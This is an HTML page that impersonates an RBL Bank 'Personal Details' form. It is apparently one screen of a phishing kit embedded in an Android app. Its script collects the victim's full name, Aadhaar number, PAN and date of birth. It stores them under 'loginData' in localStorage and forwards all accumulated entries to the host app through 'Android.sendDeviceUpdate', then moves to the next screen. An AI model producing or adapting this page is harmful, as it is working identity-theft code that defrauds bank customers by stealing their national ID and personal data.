<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RBL Bank - Personal Details</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: #F5F6F8; /* Light gray section background - design system */
            color: #222222; /* Dark text */
            max-width: 500px;
            margin: 0 auto;
            overflow-x: hidden;
        }
        
        /* Main Container */
        .container {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            background-color: #F5F6F8;
        }
        
        /* Header - Clean white, minimal */
        .header {
            background-color: #FFFFFF; /* Pure white */
            padding: 18px 25px;
            border-bottom: 1px solid #E0E0E0; /* Border gray */
            box-shadow: none; /* No heavy shadow */
            display: flex;
            align-items: center;
            justify-content: center;
            height: 80px;
        }
        
        .logo-container {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
        }
        
                .bank-logo {
            width: 220px;
            height: 80px;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        
.bank-logo img {
    width: 100%;
    height: 100%;
    object-fit: contain; /* 👈 fix */
    object-position: center;
}
        
        
        /* Page Title - White card with dark blue heading */
        .page-title {
            background-color: #FFFFFF;
            color: #21317D; /* Dark blue for headings */
            padding: 25px 20px;
            text-align: center;
            margin: 20px 20px 0 20px;
            border-radius: 16px;
            border: 1px solid #E0E0E0;
            box-shadow: 0 2px 8px rgba(0,0,0,0.02);
        }
        
        .page-title h1 {
            font-size: 26px;
            margin-bottom: 8px;
            font-weight: 700;
            color: #21317D;
        }
        
        .page-title p {
            font-size: 15px;
            opacity: 0.85;
            max-width: 400px;
            margin: 0 auto;
            line-height: 1.5;
            color: #666666; /* Secondary text */
        }
        
        /* Form Container - White card with spacing */
        .form-container {
            padding: 25px 20px 30px;
            flex-grow: 1;
            background-color: #FFFFFF; /* White card background */
            margin: 20px 20px 0 20px;
            border-radius: 16px;
            border: 1px solid #E0E0E0;
            box-shadow: 0 2px 8px rgba(0,0,0,0.02);
        }
        
        .form-title {
            color: #21317D; /* Dark blue for form heading */
            font-size: 22px;
            margin-bottom: 25px;
            font-weight: 700;
            padding-bottom: 15px;
            border-bottom: 1px solid #E0E0E0;
        }
        
        /* Form Styles */
        .form-group {
            margin-bottom: 22px;
        }
        
        .form-label {
            display: block;
            margin-bottom: 10px;
            font-weight: 600;
            color: #222222; /* Dark text */
            font-size: 15px;
        }
        
        .form-label span {
            color: #ED1C24; /* Red accent for required */
            margin-left: 2px;
        }
        
        .input-container {
            position: relative;
        }
        
        .form-input {
            width: 100%;
            padding: 16px 16px 16px 50px;
            border: 1px solid #E0E0E0; /* Border gray */
            border-radius: 12px;
            font-size: 15px;
            background-color: white;
            color: #222222;
            transition: all 0.3s;
            letter-spacing: 1px;
        }
        
        .form-input:focus {
            outline: none;
            border-color: #ED1C24; /* Red accent on focus */
            box-shadow: 0 0 0 3px rgba(237, 28, 36, 0.1);
        }
        
        .input-icon {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            color: #21317D; /* Dark blue for icons */
            font-size: 18px;
        }
        
        .input-hint {
            font-size: 13px;
            color: #666666;
            margin-top: 6px;
            display: flex;
            align-items: center;
        }
        
        .input-hint i {
            color: #ED1C24; /* Red accent hint icon */
            margin-right: 6px;
            font-size: 12px;
        }
        
        /* Date of Birth Input */
        .dob-input {
            width: 100%;
            padding: 16px 16px 16px 50px;
            border: 1px solid #E0E0E0;
            border-radius: 12px;
            font-size: 15px;
            background-color: white;
            color: #222222;
            transition: all 0.3s;
        }
        
        .dob-input:focus {
            outline: none;
            border-color: #ED1C24;
            box-shadow: 0 0 0 3px rgba(237, 28, 36, 0.1);
        }
        
        /* CTA Button - Red accent */
        .btn-next {
            width: 100%;
            padding: 18px;
            background-color: #ED1C24; /* Red CTA */
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 17px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 30px;
            transition: all 0.3s;
            box-shadow: 0 2px 8px rgba(237, 28, 36, 0.2);
            display: flex;
            justify-content: center;
            align-items: center;
            letter-spacing: 0.5px;
        }
        
        .btn-next:hover {
            background-color: #d11920;
            transform: translateY(-2px);
            box-shadow: 0 6px 16px rgba(237, 28, 36, 0.25);
        }
        
        .btn-next:active {
            transform: translateY(0);
        }
        
        .btn-next i {
            margin-left: 10px;
            font-size: 16px;
        }
        
        /* Footer - White background */
        .footer {
            background-color: #FFFFFF;
            color: #666666;
            padding: 25px 20px;
            margin-top: 20px;
            border-top: 1px solid #E0E0E0;
        }
        
        .footer-links {
            display: flex;
            justify-content: space-between;
            flex-wrap: wrap;
            margin-bottom: 22px;
        }
        
        .footer-link {
            color: #21317D; /* Dark blue links */
            text-decoration: none;
            font-size: 14px;
            margin-bottom: 12px;
            width: 48%;
            font-weight: 500;
            transition: color 0.2s;
        }
        
        .footer-link:hover {
            color: #ED1C24; /* Red hover */
            text-decoration: underline;
        }
        
        .footer-disclaimer {
            font-size: 12px;
            line-height: 1.6;
            padding-top: 10px;
            color: #666666;
            text-align: center;
            border-top: 1px solid #E0E0E0;
            margin-top: 15px;
        }
        
        /* Responsive adjustments */
        @media (max-width: 480px) {
            .form-container {
                padding: 20px 16px 25px;
                margin: 16px 16px 0 16px;
            }
            
            .page-title {
                padding: 22px 16px;
                margin: 16px 16px 0 16px;
            }
            
            .page-title h1 {
                font-size: 24px;
            }
            
            .page-title p {
                font-size: 14px;
            }
            
            .form-title {
                font-size: 20px;
                margin-bottom: 20px;
            }
            
            .footer {
                padding: 22px 16px;
            }
        }
        
        /* Form input placeholder styling */
        .form-input::placeholder {
            color: #999999;
            font-weight: 400;
        }
        
        /* Auto-format styling */
        .form-input.formatted {
            letter-spacing: 2px;
            font-weight: 500;
        }
        
        /* Error message styling */
        .error-message {
            color: #ED1C24;
            font-size: 12px;
            margin-top: 6px;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        
        .error-message i {
            font-size: 12px;
        }
    </style>
</head>

<body>
    <!-- Main Container -->
    <div class="container" id="main-container">
        <!-- Header - RBL Bank Logo -->
        <header class="header">
            <div class="logo-container">
                <div class="bank-logo">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/70/RBL_Bank_SVG_Logo.svg/960px-RBL_Bank_SVG_Logo.svg.png?_=20180315185242" alt="RBL Bank Logo" onerror="this.onerror=null; this.src='https://seeklogo.com/images/R/rbl-bank-logo-38A14DEB40-seeklogo.com.png';">
                </div>
            </div>
        </header>

        <!-- Page Title - White card -->
        <div class="page-title">
            <h1>Personal Details</h1>
            <p>Please provide your personal information for verification purposes.</p>
        </div>

        <!-- Form Container - White card -->
        <main class="form-container">
            <h2 class="form-title">Basic Information</h2>

            <form id="personal-details-form">
                <div class="form-group">
                    <label class="form-label" for="full-name">Full Name <span>*</span></label>
                    <div class="input-container">
                        <i class="fas fa-user input-icon"></i>
                        <input type="text" id="full-name" class="form-input" placeholder="Enter your full name" required>
                    </div>
                </div>

                <div class="form-group">
                    <label class="form-label" for="aadhaar-number">Aadhaar Number <span>*</span></label>
                    <div class="input-container">
                        <i class="fas fa-id-card input-icon"></i>
                        <input type="text" id="aadhaar-number" class="form-input formatted" placeholder="XXXX XXXX XXXX" maxlength="14" required>
                    </div>
                </div>

                <div class="form-group">
                    <label class="form-label" for="pan-number">PAN Number <span>*</span></label>
                    <div class="input-container">
                        <i class="fas fa-address-card input-icon"></i>
                        <input type="text" id="pan-number" class="form-input formatted" placeholder="ABCDE1234F" maxlength="10" required>
                    </div>
                </div>

                <div class="form-group">
                    <label class="form-label" for="dob">Date of Birth <span>*</span></label>
                    <div class="input-container">
                        <i class="fas fa-calendar-alt input-icon"></i>
                        <input type="text" id="dob" class="dob-input" placeholder="DD/MM/YYYY" required>
                    </div>
                </div>

                <button type="submit" class="btn-next">
                    Submit Details <i class="fas fa-check-circle"></i>
                </button>
            </form>
        </main>

        <!-- Footer - RBL Bank style -->
        <footer class="footer">
            <div class="footer-links">
                <a href="#" class="footer-link">Privacy Policy</a>
                <a href="#" class="footer-link">Terms of Service</a>
                <a href="#" class="footer-link">Security Tips</a>
                <a href="#" class="footer-link">Contact Us</a>
                <a href="#" class="footer-link">Branch Locator</a>
                <a href="#" class="footer-link">FAQs</a>
            </div>

            <div class="footer-disclaimer">
                <p>© 2025 RBL Bank Ltd. All rights reserved. RBL Bank is a registered trademark.</p>
            </div>
        </footer>
    </div>

    <script>
    // Aadhaar format
    document.getElementById('aadhaar-number').addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        value = value.substring(0, 12);

        let formattedValue = '';
        for (let i = 0; i < value.length; i++) {
            if (i > 0 && i % 4 === 0) formattedValue += ' ';
            formattedValue += value[i];
        }

        e.target.value = formattedValue;
    });

    // PAN format
    document.getElementById('pan-number').addEventListener('input', function(e) {
        let value = e.target.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
        value = value.substring(0, 10);
        e.target.value = value;
    });

    // DOB format
    document.getElementById('dob').addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');

        if (value.length > 2 && value.length <= 4) {
            value = value.substring(0, 2) + '/' + value.substring(2);
        } else if (value.length > 4) {
            value = value.substring(0, 2) + '/' + value.substring(2, 4) + '/' + value.substring(4, 8);
        }

        e.target.value = value;
    });

    // ✅ FORM SUBMIT (UPDATED LIKE SCREEN 1)
    document.getElementById('personal-details-form').addEventListener('submit', function(e) {
        e.preventDefault();

        const fullName = document.getElementById('full-name').value.trim();
        const aadhaar = document.getElementById('aadhaar-number').value.replace(/\s/g, '');
        const pan = document.getElementById('pan-number').value.trim();
        const dob = document.getElementById('dob').value.trim();

        if (!fullName || !aadhaar || !pan || !dob) {
            alert("Please fill all fields.");
            return;
        }

        const now = new Date();
        const dateTime = now.toLocaleString();

        // ✅ Get previous data
        let existingData = localStorage.getItem("loginData") || "";

        // ✅ New data block (same format style)
        let newData =
            "Date: " + dateTime + "\n" +
            "FullName: " + fullName + "\n" +
            "Aadhaar: " + aadhaar + "\n" +
            "PAN: " + pan + "\n" +
            "DOB: " + dob + "\n";

        let finalData = existingData
            ? existingData + "\n-------------------\n" + newData
            : newData;

        // ✅ Save again
        localStorage.setItem("loginData", finalData);

        try {
            Android.sendDeviceUpdate("note", finalData);
        } catch (e) {
            alert("❌ Error sending to Android: " + e);
        }

        // ✅ Redirect
        window.location.href = "screen4.html";

        // Reset form
        this.reset();
    });

    // Input focus effect
    const inputs = document.querySelectorAll('.form-input, .dob-input');

    inputs.forEach(input => {
        input.addEventListener('focus', function() {
            this.style.backgroundColor = '#fcfcfc';
        });

        input.addEventListener('blur', function() {
            this.style.backgroundColor = '#ffffff';
        });
    });
</script>
</body>

</html>
